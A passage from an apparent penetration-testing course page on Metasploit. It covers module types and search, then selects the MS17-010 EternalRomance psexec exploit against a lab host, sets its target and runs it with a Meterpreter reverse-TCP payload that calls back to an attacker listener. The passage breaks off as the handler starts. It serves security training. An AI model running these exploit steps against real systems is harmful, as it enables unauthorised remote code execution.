<tbody>
<tr>
<td><code>Auxiliary</code></td>
<td>Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.</td>
</tr>
<tr>
<td><code>Encoders</code></td>
<td>Ensure that payloads are intact to their destination.</td>
</tr>
<tr>
<td><code>Exploits</code></td>
<td>Defined as modules that exploit a vulnerability that will allow for the payload delivery.</td>
</tr>
<tr>
<td><code>NOPs</code></td>
<td>(No Operation code) Keep the payload sizes consistent across exploit attempts.</td>
</tr>
<tr>
<td><code>Payloads</code></td>
<td>Code runs remotely and calls back to the attacker machine to establish a connection (or shell).</td>
</tr>
<tr>
<td><code>Plugins</code></td>
<td>Additional scripts can be integrated within an assessment with <code>msfconsole</code> and coexist.</td>
</tr>
<tr>
<td><code>Post</code></td>
<td>Wide array of modules to gather information, pivot deeper, etc.</td>
</tr>
</tbody>
</table>
<p>Note that when selecting a module to use for payload delivery, the <code>use &lt;no.&gt;</code> command can only be used with the following modules that can be used as <code>initiators</code> (or interactable modules):</p>
<table>
<thead>
<tr>
<th><strong>Type</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Auxiliary</code></td>
<td>Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.</td>
</tr>
<tr>
<td><code>Exploits</code></td>
<td>Defined as modules that exploit a vulnerability that will allow for the payload delivery.</td>
</tr>
<tr>
<td><code>Post</code></td>
<td>Wide array of modules to gather information, pivot deeper, etc.</td>
</tr>
</tbody>
</table>
<p><strong>OS</strong></p>
<p>The <code>OS</code> tag specifies which operating system and architecture the module was created for. Naturally, different operating systems require different code to be run to get the desired results.</p>
<p><strong>Service</strong></p>
<p>The <code>Service</code> tag refers to the vulnerable service that is running on the target machine. For some modules, such as the <code>auxiliary</code> or <code>post</code> ones, this tag can refer to a more general activity such as <code>gather</code>, referring to the gathering of credentials, for example.</p>
<p><strong>Name</strong></p>
<p>Finally, the <code>Name</code> tag explains the actual action that can be performed using this module created for a specific purpose.</p>
<hr>
<h3 id="searching-for-modules">Searching for Modules</h3>
<p>Metasploit also offers a well-developed search function for the existing modules. With the help of this function, we can quickly search through all the modules using specific <code>tags</code> to find a suitable one for our target.</p>
<p><strong>MSF - Search Function</strong></p>
<p>Modules</p>
<pre><code class="lang-shell-session">msf6 &gt; help search

Usage: search [&lt;options&gt;] [&lt;keywords&gt;:&lt;value&gt;]

Prepending a value <span class="hljs-keyword">with</span> <span class="hljs-string">'-'</span> will exclude any <span class="hljs-keyword">matching</span> results.
<span class="hljs-keyword">If</span> no options <span class="hljs-keyword">or</span> keywords are provided, cached results are displayed.

OPTIONS:
  -h                   Show this help information
  -o &lt;file&gt;            Send output <span class="hljs-keyword">to</span> a file <span class="hljs-keyword">in</span> csv format
  -S &lt;string&gt;          Regex pattern used <span class="hljs-keyword">to</span> filter search results
  -u                   Use <span class="hljs-keyword">module</span> <span class="hljs-keyword">if</span> there <span class="hljs-keyword">is</span> one <span class="hljs-keyword">result</span>
  -s &lt;search_column&gt;   Sort the research results based <span class="hljs-keyword">on</span> &lt;search_column&gt; <span class="hljs-keyword">in</span> ascending <span class="hljs-keyword">order</span>
  -r                   <span class="hljs-keyword">Reverse</span> the search results <span class="hljs-keyword">order</span> <span class="hljs-keyword">to</span> descending <span class="hljs-keyword">order</span>

Keywords:
  aka              :  Modules <span class="hljs-keyword">with</span> a <span class="hljs-keyword">matching</span> AKA (also-known-<span class="hljs-keyword">as</span>) name
  author           :  Modules written <span class="hljs-keyword">by</span> this author
  arch             :  Modules affecting this architecture
  bid              :  Modules <span class="hljs-keyword">with</span> a <span class="hljs-keyword">matching</span> Bugtraq ID
  cve              :  Modules <span class="hljs-keyword">with</span> a <span class="hljs-keyword">matching</span> CVE ID
  edb              :  Modules <span class="hljs-keyword">with</span> a <span class="hljs-keyword">matching</span> Exploit-DB ID
  check            :  Modules that support the <span class="hljs-string">'check'</span> <span class="hljs-function"><span class="hljs-keyword">method</span>
  <span class="hljs-title">date</span>             :</span>  Modules <span class="hljs-keyword">with</span> a <span class="hljs-keyword">matching</span> disclosure date
  description      :  Modules <span class="hljs-keyword">with</span> a <span class="hljs-keyword">matching</span> description
  fullname         :  Modules <span class="hljs-keyword">with</span> a <span class="hljs-keyword">matching</span> full name
  mod_time         :  Modules <span class="hljs-keyword">with</span> a <span class="hljs-keyword">matching</span> modification date
  name             :  Modules <span class="hljs-keyword">with</span> a <span class="hljs-keyword">matching</span> descriptive name
  path             :  Modules <span class="hljs-keyword">with</span> a <span class="hljs-keyword">matching</span> path
  <span class="hljs-keyword">platform</span>         :  Modules affecting this <span class="hljs-keyword">platform</span>
  port             :  Modules <span class="hljs-keyword">with</span> a <span class="hljs-keyword">matching</span> port
  rank             :  Modules <span class="hljs-keyword">with</span> a <span class="hljs-keyword">matching</span> rank (Can be descriptive (ex: <span class="hljs-string">'good'</span>) <span class="hljs-keyword">or</span> numeric <span class="hljs-keyword">with</span> comparison operators (ex: <span class="hljs-string">'gte400'</span>))
  ref              :  Modules <span class="hljs-keyword">with</span> a <span class="hljs-keyword">matching</span> ref
  <span class="hljs-keyword">reference</span>        :  Modules <span class="hljs-keyword">with</span> a <span class="hljs-keyword">matching</span> <span class="hljs-keyword">reference</span>
  target           :  Modules affecting this target
  <span class="hljs-keyword">type</span>             :  Modules <span class="hljs-keyword">of</span> a specific <span class="hljs-keyword">type</span> (exploit, payload, auxiliary, encoder, evasion, post, <span class="hljs-keyword">or</span> nop)

Supported search columns:
  rank             :  Sort modules <span class="hljs-keyword">by</span> their exploitabilty rank
  date             :  Sort modules <span class="hljs-keyword">by</span> their disclosure date. Alias <span class="hljs-keyword">for</span> disclosure_date
  disclosure_date  :  Sort modules <span class="hljs-keyword">by</span> their disclosure date
  name             :  Sort modules <span class="hljs-keyword">by</span> their name
  <span class="hljs-keyword">type</span>             :  Sort modules <span class="hljs-keyword">by</span> their <span class="hljs-keyword">type</span>
  check            :  Sort modules <span class="hljs-keyword">by</span> whether <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> they have a check <span class="hljs-function"><span class="hljs-keyword">method</span>

<span class="hljs-title">Examples</span>:</span>
  search cve:<span class="hljs-number">2009</span> <span class="hljs-keyword">type</span>:exploit
  search cve:<span class="hljs-number">2009</span> <span class="hljs-keyword">type</span>:exploit <span class="hljs-keyword">platform</span>:-linux
  search cve:<span class="hljs-number">2009</span> -s name
  search <span class="hljs-keyword">type</span>:exploit -s <span class="hljs-keyword">type</span> -r
</code></pre>
<p>For example, we can try to find the <code>EternalRomance</code> exploit for older Windows operating systems. This could look something like this:</p>
<hr>
<p><strong>MSF - Searching for EternalRomance</strong></p>
<p>Modules</p>
<pre><code class="lang-shell-session">msf6 &gt; search eternalromance

<span class="hljs-section">Matching Modules
================</span>

<span class="hljs-code">   #  Name                                  Disclosure Date  Rank    Check  Description</span>
<span class="hljs-code">   -  ----                                  ---------------  ----    -----  -----------</span>
<span class="hljs-code">   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span>
<span class="hljs-code">   1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span>



msf6 &gt; search eternalromance type:exploit

<span class="hljs-section">Matching Modules
================</span>

<span class="hljs-code">   #  Name                                  Disclosure Date  Rank    Check  Description</span>
<span class="hljs-code">   -  ----                                  ---------------  ----    -----  -----------</span>
<span class="hljs-code">   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span>
</code></pre>
<p>We can also make our search a bit more coarse and reduce it to one category of services. For example, for the CVE, we could specify the year (<code>cve:&lt;year&gt;</code>), the platform Windows (<code>platform:&lt;os&gt;</code>), the type of module we want to find (<code>type:&lt;auxiliary/exploit/post&gt;</code>), the reliability rank (<code>rank:&lt;rank&gt;</code>), and the search name (<code>&lt;pattern&gt;</code>). This would reduce our results to only those that match all of the above.</p>
<p><strong>MSF - Specific Search</strong></p>
<p>Modules</p>
<pre><code class="lang-shell-session">msf6 &gt; search type:exploit platform:windows cve:2021 rank:excellent microsoft

<span class="hljs-section">Matching Modules
================</span>

<span class="hljs-code">   #  Name                                            Disclosure Date  Rank       Check  Description</span>
<span class="hljs-code">   -  ----                                            ---------------  ----       -----  -----------</span>
<span class="hljs-code">   0  exploit/windows/http/exchange_proxylogon_rce    2021-03-02       excellent  Yes    Microsoft Exchange ProxyLogon RCE</span>
<span class="hljs-code">   1  exploit/windows/http/exchange_proxyshell_rce    2021-04-06       excellent  Yes    Microsoft Exchange ProxyShell RCE</span>
<span class="hljs-code">   2  exploit/windows/http/sharepoint_unsafe_control  2021-05-11       excellent  Yes    Microsoft SharePoint Unsafe Control and ViewState RCE</span>
</code></pre>
<hr>
<h3 id="module-selection">Module Selection</h3>
<p>To select our first module, we first need to find one. Let&#39;s suppose that we have a target running a version of SMB vulnerable to EternalRomance (MS17_010) exploits. We have found that SMB server port 445 is open upon scanning the target.</p>
<p>Modules</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ nmap -sV <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.40</span>

Starting Nmap <span class="hljs-number">7.80</span> ( <span class="hljs-string">https:</span><span class="hljs-comment">//nmap.org ) at 2020-08-13 21:38 UTC</span>
<span class="hljs-string">Stats:</span> <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">50</span> elapsed; <span class="hljs-number">0</span> hosts completed (<span class="hljs-number">1</span> up), <span class="hljs-number">1</span> undergoing Service Scan
Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.40</span>
Host is up (<span class="hljs-number">0.051</span>s latency).
Not <span class="hljs-string">shown:</span> <span class="hljs-number">991</span> closed ports
PORT      STATE SERVICE      VERSION
<span class="hljs-number">135</span>/tcp   open  msrpc        Microsoft Windows RPC
<span class="hljs-number">139</span>/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
<span class="hljs-number">445</span>/tcp   open  microsoft-ds Microsoft Windows <span class="hljs-number">7</span> - <span class="hljs-number">10</span> microsoft-ds (<span class="hljs-string">workgroup:</span> WORKGROUP)
<span class="hljs-number">49152</span>/tcp open  msrpc        Microsoft Windows RPC
<span class="hljs-number">49153</span>/tcp open  msrpc        Microsoft Windows RPC
<span class="hljs-number">49154</span>/tcp open  msrpc        Microsoft Windows RPC
<span class="hljs-number">49155</span>/tcp open  msrpc        Microsoft Windows RPC
<span class="hljs-number">49156</span>/tcp open  msrpc        Microsoft Windows RPC
<span class="hljs-number">49157</span>/tcp open  msrpc        Microsoft Windows RPC
Service <span class="hljs-string">Info:</span> <span class="hljs-string">Host:</span> HARIS-PC; <span class="hljs-string">OS:</span> Windows; <span class="hljs-string">CPE:</span> <span class="hljs-string">cpe:</span>/<span class="hljs-string">o:</span><span class="hljs-string">microsoft:</span>windows

Service detection performed. Please report any incorrect results at <span class="hljs-string">https:</span><span class="hljs-comment">//nmap.org/submit/ .</span>
Nmap <span class="hljs-string">done:</span> <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">60.87</span> seconds
</code></pre>
<p>We would boot up <code>msfconsole</code> and search for this exact exploit name.</p>
<p><strong>MSF - Search for MS17_010</strong></p>
<p>Modules</p>
<pre><code class="lang-shell-session">msf6 &gt; search ms17_010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   <span class="hljs-number">0</span>  exploit/windows/smb/ms17_010_eternalblue  <span class="hljs-number">2017</span><span class="hljs-number">-03</span><span class="hljs-number">-14</span>       average  Yes    MS17<span class="hljs-number">-010</span> EternalBlue SMB Remote Windows Kernel Pool Corruption
   <span class="hljs-number">1</span>  exploit/windows/smb/ms17_010_psexec       <span class="hljs-number">2017</span><span class="hljs-number">-03</span><span class="hljs-number">-14</span>       normal   Yes    MS17<span class="hljs-number">-010</span> EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   <span class="hljs-number">2</span>  auxiliary/admin/smb/ms17_010_command      <span class="hljs-number">2017</span><span class="hljs-number">-03</span><span class="hljs-number">-14</span>       normal   No     MS17<span class="hljs-number">-010</span> EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   <span class="hljs-number">3</span>  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17<span class="hljs-number">-010</span> SMB RCE Detection
</code></pre>
<p>Next, we want to select the appropriate module for this scenario. From the <code>Nmap</code> scan, we have detected the SMB service running on version <code>Microsoft Windows 7 - 10</code>. With some additional OS scanning, we can guess that this is a Windows 7 running a vulnerable instance of SMB. We then proceed to select the module with the <code>index no. 2</code> to test if the target is vulnerable.</p>
<hr>
<h3 id="using-modules">Using Modules</h3>
<p>Within the interactive modules, there are several options that we can specify. These are used to adapt the Metasploit module to the given environment. Because in most cases, we always need to scan or attack different IP addresses. Therefore, we require this kind of functionality to allow us to set our targets and fine-tune them. To check which options are needed to be set before the exploit can be sent to the target host, we can use the <code>show options</code> command. Everything required to be set before the exploitation can occur will have a <code>Yes</code> under the <code>Required</code> column.</p>
<p><strong>MSF - Select Module</strong></p>
<p>Modules</p>
<pre><code class="lang-shell-session">
<span class="hljs-symbol">&lt;SNIP&gt;</span>

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   <span class="hljs-number">0</span>  exploit/windows/smb/ms17_010_psexec   <span class="hljs-number">2017</span>-<span class="hljs-number">03</span>-<span class="hljs-number">14</span>       <span class="hljs-keyword">normal</span>  Yes    MS17-<span class="hljs-number">010</span> EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   <span class="hljs-number">1</span>  auxiliary/admin/smb/ms17_010_command  <span class="hljs-number">2017</span>-<span class="hljs-number">03</span>-<span class="hljs-number">14</span>       <span class="hljs-keyword">normal</span>  No     MS17-<span class="hljs-number">010</span> EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution


msf6 &gt; use <span class="hljs-number">0</span>
msf6 exploit(windows/smb/ms17_010_psexec) &gt; <span class="hljs-keyword">options</span>

Module <span class="hljs-keyword">options</span> (exploit/windows/smb/ms17_010_psexec): 

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra <span class="hljs-keyword">debug</span> trace info
   LEAKATTEMPTS          <span class="hljs-number">99</span>                                       yes       How many times <span class="hljs-keyword">to</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">to</span> leak transaction
   NAMEDPIPE                                                      <span class="hljs-keyword">no</span>        A named pipe that can <span class="hljs-keyword">be</span> connected <span class="hljs-keyword">to</span> (leave blank <span class="hljs-keyword">for</span> auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes <span class="hljs-keyword">to</span> check
                         rdlists/named_pipes.txt
   RHOSTS                                                         yes       The target host(s), see http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 <span class="hljs-number">445</span>                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            <span class="hljs-keyword">no</span>        Service description <span class="hljs-keyword">to</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">be</span> used <span class="hljs-keyword">on</span> target <span class="hljs-keyword">for</span> pretty listing
   SERVICE_DISPLAY_NAME                                           <span class="hljs-keyword">no</span>        The service <span class="hljs-keyword">display</span> name
   SERVICE_NAME                                                   <span class="hljs-keyword">no</span>        The service name
   SHARE                 ADMIN$                                   yes       The share <span class="hljs-keyword">to</span> connect <span class="hljs-keyword">to</span>, can <span class="hljs-keyword">be</span> <span class="hljs-keyword">an</span> admin share (ADMIN$,C$,...) <span class="hljs-built_in">or</span> <span class="hljs-keyword">a</span> <span class="hljs-keyword">no</span>
                                                                            rmal <span class="hljs-keyword">read</span>/<span class="hljs-keyword">write</span> folder share
   SMBDomain             .                                        <span class="hljs-keyword">no</span>        The Windows domain <span class="hljs-keyword">to</span> use <span class="hljs-keyword">for</span> authentication
   SMBPass                                                        <span class="hljs-keyword">no</span>        The password <span class="hljs-keyword">for</span> the specified username
   SMBUser                                                        <span class="hljs-keyword">no</span>        The username <span class="hljs-keyword">to</span> authenticate <span class="hljs-keyword">as</span>


Payload <span class="hljs-keyword">options</span> (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: <span class="hljs-string">''</span>, seh, thread, process, none)
   LHOST                      yes       The listen address (<span class="hljs-keyword">an</span> interface may <span class="hljs-keyword">be</span> specified)
   LPORT     <span class="hljs-number">4444</span>             yes       The listen port


Exploit targe<span class="hljs-variable">t:</span>

   Id  Name
   --  ----
   <span class="hljs-number">0</span>   Automatic
</code></pre>
<p>Here we see how helpful the <code>No.</code> tags can be. Because now, we do not have to type the whole path but only the number assigned to the Metasploit module in our search. We can use the command <code>info</code> after selecting the module if we want to know something more about the module. This will give us a series of information that can be important for us.</p>
<p><strong>MSF - Module Information</strong></p>
<p>Modules</p>
<pre><code class="lang-shell-session">msf6 exploit(windows/smb/ms17_010_psexec) &gt; info

       Name: MS17<span class="hljs-number">-010</span> EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
     Module: exploit/windows/smb/ms17_010_psexec
   Platform: Windows
       Arch: x86, x64
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: <span class="hljs-number">2017</span><span class="hljs-number">-03</span><span class="hljs-number">-14</span>

Provided <span class="hljs-keyword">by</span>:
  sleepya
  zerosum0x0
  Shadow Brokers
  Equation Group

Available targets:
  Id  Name
  <span class="hljs-comment">--  ----</span>
  <span class="hljs-number">0</span>   Automatic
  <span class="hljs-number">1</span>   PowerShell
  <span class="hljs-number">2</span>   Native upload
  <span class="hljs-number">3</span>   MOF upload

Check supported:
  Yes

Basic options:
  Name                  Current Setting                          Required  Description
  <span class="hljs-comment">----                  ---------------                          --------  -----------</span>
  DBGTRACE              <span class="hljs-literal">false</span>                                    yes       Show extra debug trace info
  LEAKATTEMPTS          <span class="hljs-number">99</span>                                       yes       How many times <span class="hljs-built_in">to</span> <span class="hljs-keyword">try</span> <span class="hljs-built_in">to</span> leak transaction
  NAMEDPIPE                                                      no        A named pipe that can be connected <span class="hljs-built_in">to</span> (leave blank <span class="hljs-keyword">for</span> auto)
  NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List <span class="hljs-keyword">of</span> named pipes <span class="hljs-built_in">to</span> check
                        rdlists/named_pipes.txt
  RHOSTS                                                         yes       The target host(s), see <span class="hljs-keyword">https</span>://github.com/rapid7/metasploit-framework/
                                                                           wiki/Using-Metasploit
  RPORT                 <span class="hljs-number">445</span>                                      yes       The Target port (TCP)
  SERVICE_DESCRIPTION                                            no        Service description <span class="hljs-built_in">to</span> <span class="hljs-built_in">to</span> be used <span class="hljs-keyword">on</span> <span class="hljs-title">target</span> <span class="hljs-title">for</span> <span class="hljs-title">pretty</span> <span class="hljs-title">listing</span>
  SERVICE_DISPLAY_NAME                                           no        The service display name
  SERVICE_NAME                                                   no        The service name
  SHARE                 ADMIN$                                   yes       The share <span class="hljs-built_in">to</span> connect <span class="hljs-built_in">to</span>, can be <span class="hljs-keyword">an</span> admin share (ADMIN$,C$,...) <span class="hljs-keyword">or</span> <span class="hljs-keyword">a</span> nor
                                                                           mal <span class="hljs-built_in">read</span>/<span class="hljs-built_in">write</span> <span class="hljs-built_in">folder</span> share
  SMBDomain             .                                        no        The Windows domain <span class="hljs-built_in">to</span> use <span class="hljs-keyword">for</span> authentication
  SMBPass                                                        no        The password <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> specified username
  SMBUser                                                        no        The username <span class="hljs-built_in">to</span> authenticate <span class="hljs-keyword">as</span>

Payload information:
  Space: <span class="hljs-number">3072</span>

Description:
  This module will exploit SMB <span class="hljs-keyword">with</span> vulnerabilities <span class="hljs-keyword">in</span> MS17<span class="hljs-number">-010</span> <span class="hljs-built_in">to</span> 
  achieve <span class="hljs-keyword">a</span> <span class="hljs-built_in">write</span>-what-where primitive. This will <span class="hljs-keyword">then</span> be used <span class="hljs-built_in">to</span> 
  overwrite <span class="hljs-keyword">the</span> connection session information <span class="hljs-keyword">with</span> <span class="hljs-keyword">as</span> <span class="hljs-keyword">an</span> 
  Administrator session. From there, <span class="hljs-keyword">the</span> <span class="hljs-keyword">normal</span> psexec payload code 
  execution is done. Exploits <span class="hljs-keyword">a</span> type confusion between Transaction <span class="hljs-keyword">and</span> 
  WriteAndX requests <span class="hljs-keyword">and</span> <span class="hljs-keyword">a</span> race condition <span class="hljs-keyword">in</span> Transaction requests, <span class="hljs-keyword">as</span> 
  seen <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> EternalRomance, EternalChampion, <span class="hljs-keyword">and</span> EternalSynergy 
  exploits. This exploit chain is more reliable than <span class="hljs-keyword">the</span> EternalBlue 
  exploit, but requires <span class="hljs-keyword">a</span> named pipe.

References:
  <span class="hljs-keyword">https</span>://docs.microsoft.com/en-us/security-updates/SecurityBulletins/<span class="hljs-number">2017</span>/MS17<span class="hljs-number">-010</span>
  <span class="hljs-keyword">https</span>://nvd.nist.gov/vuln/detail/CVE<span class="hljs-number">-2017</span><span class="hljs-number">-0143</span>
  <span class="hljs-keyword">https</span>://nvd.nist.gov/vuln/detail/CVE<span class="hljs-number">-2017</span><span class="hljs-number">-0146</span>
  <span class="hljs-keyword">https</span>://nvd.nist.gov/vuln/detail/CVE<span class="hljs-number">-2017</span><span class="hljs-number">-0147</span>
  <span class="hljs-keyword">https</span>://github.com/worawit/MS17<span class="hljs-number">-010</span>
  <span class="hljs-keyword">https</span>://hitcon.org/<span class="hljs-number">2017</span>/CMT/slide-<span class="hljs-built_in">files</span>/d2_s2_r0.pdf
  <span class="hljs-keyword">https</span>://blogs.technet.microsoft.com/srd/<span class="hljs-number">2017</span>/<span class="hljs-number">06</span>/<span class="hljs-number">29</span>/eternal-champion-exploit-analysis/

Also known <span class="hljs-keyword">as</span>:
  ETERNALSYNERGY
  ETERNALROMANCE
  ETERNALCHAMPION
  ETERNALBLUE
</code></pre>
<p>After we are satisfied that the selected module is the right one for our purpose, we need to set some specifications to customize the module to use it successfully against our target host, such as setting the target (<code>RHOST</code> or <code>RHOSTS</code>).</p>
<p><strong>MSF - Target Specification</strong></p>
<p>Modules</p>
<pre><code class="lang-shell-session">msf6 exploit(windows/smb/ms17_010_psexec) &gt; <span class="hljs-keyword">set</span> RHOSTS <span class="hljs-number">10.10</span>.<span class="hljs-number">10.40</span>

RHOSTS =&gt; <span class="hljs-number">10.10</span>.<span class="hljs-number">10.40</span>


msf6 exploit(windows/smb/ms17_010_psexec) &gt; <span class="hljs-keyword">options</span>

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra <span class="hljs-keyword">debug</span> trace info
   LEAKATTEMPTS          <span class="hljs-number">99</span>                                       yes       How many times <span class="hljs-keyword">to</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">to</span> leak transaction
   NAMEDPIPE                                                      <span class="hljs-keyword">no</span>        A named pipe that can <span class="hljs-keyword">be</span> connected <span class="hljs-keyword">to</span> (leave blank <span class="hljs-keyword">for</span> auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes <span class="hljs-keyword">to</span> check
                         rdlists/named_pipes.txt
   RHOSTS                <span class="hljs-number">10.10</span>.<span class="hljs-number">10.40</span>                              yes       The target host(s), see http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 <span class="hljs-number">445</span>                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            <span class="hljs-keyword">no</span>        Service description <span class="hljs-keyword">to</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">be</span> used <span class="hljs-keyword">on</span> target <span class="hljs-keyword">for</span> pretty listing
   SERVICE_DISPLAY_NAME                                           <span class="hljs-keyword">no</span>        The service <span class="hljs-keyword">display</span> name
   SERVICE_NAME                                                   <span class="hljs-keyword">no</span>        The service name
   SHARE                 ADMIN$                                   yes       The share <span class="hljs-keyword">to</span> connect <span class="hljs-keyword">to</span>, can <span class="hljs-keyword">be</span> <span class="hljs-keyword">an</span> admin share (ADMIN$,C$,...) <span class="hljs-built_in">or</span> <span class="hljs-keyword">a</span> <span class="hljs-keyword">no</span>
                                                                            rmal <span class="hljs-keyword">read</span>/<span class="hljs-keyword">write</span> folder share
   SMBDomain             .                                        <span class="hljs-keyword">no</span>        The Windows domain <span class="hljs-keyword">to</span> use <span class="hljs-keyword">for</span> authentication
   SMBPass                                                        <span class="hljs-keyword">no</span>        The password <span class="hljs-keyword">for</span> the specified username
   SMBUser                                                        <span class="hljs-keyword">no</span>        The username <span class="hljs-keyword">to</span> authenticate <span class="hljs-keyword">as</span>


Payload <span class="hljs-keyword">options</span> (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: <span class="hljs-string">''</span>, seh, thread, process, none)
   LHOST                      yes       The listen address (<span class="hljs-keyword">an</span> interface may <span class="hljs-keyword">be</span> specified)
   LPORT     <span class="hljs-number">4444</span>             yes       The listen port


Exploit targe<span class="hljs-variable">t:</span>

   Id  Name
   --  ----
   <span class="hljs-number">0</span>   Automatic
</code></pre>
<p>In addition, there is the option <code>setg</code>, which specifies options selected by us as permanent until the program is restarted. Therefore, if we are working on a particular target host, we can use this command to set the IP address once and not change it again until we change our focus to a different IP address.</p>
<p><strong>MSF - Permanent Target Specification</strong></p>
<p>Modules</p>
<pre><code class="lang-shell-session">msf6 exploit(windows/smb/ms17_010_psexec) &gt; <span class="hljs-keyword">setg</span> RHOSTS <span class="hljs-number">10.10</span>.<span class="hljs-number">10.40</span>

RHOSTS =&gt; <span class="hljs-number">10.10</span>.<span class="hljs-number">10.40</span>


msf6 exploit(windows/smb/ms17_010_psexec) &gt; <span class="hljs-keyword">options</span>

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra <span class="hljs-keyword">debug</span> trace info
   LEAKATTEMPTS          <span class="hljs-number">99</span>                                       yes       How many times <span class="hljs-keyword">to</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">to</span> leak transaction
   NAMEDPIPE                                                      <span class="hljs-keyword">no</span>        A named pipe that can <span class="hljs-keyword">be</span> connected <span class="hljs-keyword">to</span> (leave blank <span class="hljs-keyword">for</span> auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes <span class="hljs-keyword">to</span> check
                         rdlists/named_pipes.txt
   RHOSTS                <span class="hljs-number">10.10</span>.<span class="hljs-number">10.40</span>                              yes       The target host(s), see http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 <span class="hljs-number">445</span>                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            <span class="hljs-keyword">no</span>        Service description <span class="hljs-keyword">to</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">be</span> used <span class="hljs-keyword">on</span> target <span class="hljs-keyword">for</span> pretty listing
   SERVICE_DISPLAY_NAME                                           <span class="hljs-keyword">no</span>        The service <span class="hljs-keyword">display</span> name
   SERVICE_NAME                                                   <span class="hljs-keyword">no</span>        The service name
   SHARE                 ADMIN$                                   yes       The share <span class="hljs-keyword">to</span> connect <span class="hljs-keyword">to</span>, can <span class="hljs-keyword">be</span> <span class="hljs-keyword">an</span> admin share (ADMIN$,C$,...) <span class="hljs-built_in">or</span> <span class="hljs-keyword">a</span> <span class="hljs-keyword">no</span>
                                                                            rmal <span class="hljs-keyword">read</span>/<span class="hljs-keyword">write</span> folder share
   SMBDomain             .                                        <span class="hljs-keyword">no</span>        The Windows domain <span class="hljs-keyword">to</span> use <span class="hljs-keyword">for</span> authentication
   SMBPass                                                        <span class="hljs-keyword">no</span>        The password <span class="hljs-keyword">for</span> the specified username
   SMBUser                                                        <span class="hljs-keyword">no</span>        The username <span class="hljs-keyword">to</span> authenticate <span class="hljs-keyword">as</span>


Payload <span class="hljs-keyword">options</span> (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: <span class="hljs-string">''</span>, seh, thread, process, none)
   LHOST                      yes       The listen address (<span class="hljs-keyword">an</span> interface may <span class="hljs-keyword">be</span> specified)
   LPORT     <span class="hljs-number">4444</span>             yes       The listen port


Exploit targe<span class="hljs-variable">t:</span>

   Id  Name
   --  ----
   <span class="hljs-number">0</span>   Automatic
</code></pre>
<p>Once everything is set and ready to go, we can proceed to launch the attack. Note that the payload was not set here, as the default one is sufficient for this demonstration.</p>
<p><strong>MSF - Exploit Execution</strong></p>
<p>Modules</p>
<pre><code class="lang-shell-session">msf6 exploit(windows/smb/ms17_010_psexec) &gt; run

[*] Started reverse TCP handler on <span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.15</span>:<span class="hljs-number">4444</span> 
